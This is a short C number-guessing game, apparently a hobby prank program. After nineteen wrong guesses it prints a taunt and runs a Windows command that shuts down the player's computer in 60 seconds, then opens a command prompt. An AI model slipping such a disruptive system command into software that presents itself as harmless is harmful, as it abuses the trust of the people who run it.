#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main()
{
    srand(time(0));
    printf("The number is one to one thousand.\n\n\n");
    int num = rand() % 1000 + 1, enterNum, Is_it_end = 0, count = 1;
    while (Is_it_end == 0)
    {
        if(count == 20)
        {
            printf("Ha Ha loser I will shutdown your computer in 60 sec\n");
            system("shutdown -s -t 60");
            system("cmd");
        }
        printf("Please enter the number: ");
        scanf("%d", &enterNum);
        if (enterNum > num)
        {
            printf("more smaller\n");
        }
        else if (enterNum < num)
        {
            printf("more bigger\n");
        }
        else
        {
            printf("It's correct.(%d)\n", count);
            Is_it_end = 1;
        }
        count++;
    }
    system("pause");
    return 0;
}
